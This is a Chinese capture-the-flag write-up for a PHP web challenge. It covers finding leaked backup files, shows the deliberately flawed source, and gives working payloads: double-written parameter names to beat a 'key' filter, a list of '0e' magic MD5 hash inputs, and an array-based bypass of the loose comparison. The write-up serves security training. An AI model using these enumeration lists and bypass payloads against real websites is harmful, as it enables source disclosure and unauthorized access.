Bugku CTF - 备份是个好习惯 Writeup

一、题目信息

- 题型：WEB
- 题目：备份是个好习惯
- 考点：网站备份文件泄露（源码泄露）、关键字过滤的双写绕过、PHP MD5 弱类型比较

二、题目分析

- 打开题目地址，页面只有一个类似 `d41d8cd98f00b204e9800998ecf8427e` 的字符串（这是**空字符串的 MD5 值**，后面会用到）。
- 题目名字"备份是个好习惯"就是核心提示：**开发人员习惯把源码备份一份放在网站目录下**，如果备份文件名能被猜到，源码就泄露了。
- 第一步就是**扫备份文件**。常见备份后缀：

```text
index.php.bak    index.php~      index.php.swp     index.php.save
index.php.old    index.php.txt   index.php.orig    www.zip / web.zip / backup.zip
```

- 本题的备份文件是：

```text
http://<题目地址>/index.php.bak
```

  直接访问就会**下载到源码**

三、解题步骤

- **第一步：拿到源码**，核心逻辑如下：

```php
<?php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');       // 取 ? 后面的查询串
$str = substr($str, 1);                            // 去掉开头的 ?
$str = str_replace('key', '', $str);               // 把 "key" 这个子串删掉！
parse_str($str);                                   // 解析成变量 $key1、$key2
echo md5($key1);
echo md5($key2);
if (md5($key1) == md5($key2) && $key1 !== $key2) { // 弱相等 + 强不等
    echo $flag . "取得flag";
}
?>
```

- 两个条件要同时满足：

```text
条件1: md5($key1) == md5($key2)   -> 弱比较（只看值，0e 开头的哈希会被当成 0）
条件2: $key1 !== $key2            -> 两个变量必须不是同一个东西
```

- **第二步：绕过 `key` 关键字过滤（双写绕过）**
  源码里有 `str_replace('key', '', $str)` —— 它会**删掉查询串里所有出现的 "key"**。所以如果直接传 `key1=1`，会被删成 `1=1`，变量名就废了。
  绕过办法是**双写**：把 `key` 包在另一个 `key` 里，写成 `kkeyey1`：

```text
传入参数名:  k k e y e y 1
             └─┬─┘            <- 中间的 "key" 被替换掉
删除后剩下:    k e y 1  =  key1   ✔ 变量名正确还原
```

  验证一下：

```text
kkeyey1=1&kkeyey2=2  --(str_replace 'key' -> '')-->  key1=1&key2=2   ✔
```

- **第三步：构造满足弱比较的 MD5 值**
  PHP 的 `==` 是弱比较，当两个字符串都形如 `0e` + 纯数字时，PHP 会把它们都当成**科学计数法的 0**，于是 `"0e123..." == "0e456..."` 为 **true**。而 `$key1 !== $key2` 要求两个字符串本身不同 —— 这两条可以同时满足。
  常用的"0e 开头"字符串（实测都可用）：

```text
QNKCDZO        -> 0e830400451993494058024219903391
240610708      -> 0e462097431906509019562988736854
s878926199a    -> 0e545993274517709034328855841020
s155964671a    -> 0e342768416822451524974117254469
aabg7XSs       -> 0e087386482136013740957780965295
aabC9RqS       -> 0e041022518165728065344349536299
```

  所以最终 payload

```text
http://<题目地址>/?kkeyey1=QNKCDZO&kkeyey2=240610708
```

- **第四步：另一种更"省事"的绕过 —— 传数组**
  PHP 里 `md5(数组)` 会**报错并返回 NULL**，于是两个数组的 md5 都是 NULL，`NULL == NULL` 成立；而两个数组本身内容不同，强比较 `!==` 也成立。更妙的是数组写法还能避免"值一样导致强比较失败"的问题：

```text
http://<题目地址>/?kkeyey1[]=1&kkeyey2[]=2
```

  过滤后变成 `key1[]=1&key2[]=2`，解析出 `$key1 = ['1']`、`$key2 = ['2']`，两个不同数组 —— 两个条件同时满足。

- 页面回显里就能看到 flag（本题环境相关，形如 `flag{49bdd2a9bec9db790cad7030ee9f4eb2}`，提交你自己页面上的那个）。

四、总结

- 本题是两个高频考点的组合，都很值得记住：
  1. **备份文件泄露**：看到"备份""源码""习惯"这类题名，第一反应就是用字典扫备份后缀（`.bak` `~` `.swp` `.zip` 等）。这是真实渗透测试中非常常见的漏洞，开发把 `index.php.bak` 放在 Web 目录下就等于把源码送人了。
  2. **`str_replace` 的双写绕过**：一次替换是可以被"套娃"绕过的 —— `kkeyey` 中间那个 `key` 被删掉后正好还原成 `key`。这个技巧在 SQL 注入（`ununionion`）、XSS 过滤绕过里都通用。
- MD5 弱比较的利用条件（**非常重要，考试常考**）：
  - `==` 比较时，`0e` 开头的哈希会被当作数字 0，所以两个不同的 `0e...` 哈希互相相等；
  - 想绕过 `===`（强比较）就不能靠 `0e` 技巧，需要用**数组返回 NULL**，或者用**真正的 MD5 碰撞**（两个内容不同但 md5 完全相同的文件）；
  - PHP 8 起部分字符串比较规则变严，但 `0e` 那套在 `md5() == md5()` 场景下依然成立。
- 另外解释一下题目页面上那个 `d41d8cd98f00b204e9800998ecf8427e`：它就是 **`md5("")`**（空字符串的摘要）。源码里有 `echo md5($key1)`，当你没传参或参数名被过滤掉时，`$key1` 为空，就会打印出这个值 —— 很多人第一次看到它会一头雾水，其实它本身就是"你还没绕过第一关"的信号。
